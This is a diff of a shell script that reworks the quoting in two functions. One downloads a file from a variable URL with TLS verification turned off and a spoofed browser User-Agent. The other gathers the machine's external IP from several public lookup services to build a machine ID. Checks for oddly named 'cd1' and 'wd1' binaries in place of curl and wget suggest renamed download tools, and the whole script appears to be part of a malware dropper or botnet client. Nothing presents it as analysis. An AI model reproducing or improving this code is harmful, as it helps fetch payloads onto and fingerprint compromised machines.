@@ -431,19 +431,19 @@ downloads() {
         elif [ "$cmd" = "wget" ] || [ "$cmd" = "wd1" ]; then
             $cmd --timeout=30 --tries=3 -q -O "$dest" "$target_url"
         elif [ "$cmd" = "python3" ]; then
-            $cmd -c "
+            python3 -c '
 import urllib.request, ssl, sys
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
-req = urllib.request.Request('$target_url', headers={'User-Agent': 'Mozilla/5.0'})
+req = urllib.request.Request("'"$target_url"'", headers={"User-Agent": "Mozilla/5.0"})
 try:
-    with urllib.request.urlopen(req, context=ctx, timeout=30) as resp, open('$dest', 'wb') as f:
+    with urllib.request.urlopen(req, context=ctx, timeout=30) as resp, open("'"$dest"'", "wb") as f:
         f.write(resp.read())
 except Exception as e:
-    print(f'Download failed: {e}', file=sys.stderr)
+    print(f"Download failed: {e}", file=sys.stderr)
     sys.exit(1)
-"
+'
         fi
 
         [ -s "$dest" ]
@@ -474,7 +474,6 @@ generate_machine_id() {
 
     providers="http://ifconfig.me http://icanhazip.com http://ipinfo.io/ip"
 
-
     if [ -x "/usr/bin/curl" ] || [ -x "/usr/bin/cd1" ] || command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
         cmd="curl"
         if [ -x "/usr/bin/cd1" ] || command -v cd1 >/dev/null 2>&1; then
@@ -488,7 +487,6 @@ generate_machine_id() {
             fi
         done
     fi
-
 
     if [ -z "$external_ip" ] || [ "$external_ip" = "NOIP" ]; then
         if [ -x "/usr/bin/wget" ] || [ -x "/usr/bin/wd1" ] || command -v wget >/dev/null 2>&1 || command -v wd1 >/dev/null 2>&1; then
@@ -514,16 +512,15 @@ generate_machine_id() {
     if [ -z "$external_ip" ] || [ "$external_ip" = "NOIP" ]; then
         if command -v python3 >/dev/null 2>&1; then
             for provider in $providers; do
-
-                external_ip=$(python3 -c "
+               
+                external_ip=$(python3 -c '
 try:
     import urllib.request
-    url = '$provider'
-    req = urllib.request.urlopen(url, timeout=2)
-    print(req.read().decode('utf-8').strip())
+    req = urllib.request.urlopen("'"$provider"'", timeout=2)
+    print(req.read().decode("utf-8").strip())
 except Exception:
     pass
-" 2>/dev/null | tr -d '\r\n[:space:]')
+' 2>/dev/null | tr -d '\r\n[:space:]')
 
                 if echo "$external_ip" | grep -Eq '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
                     break
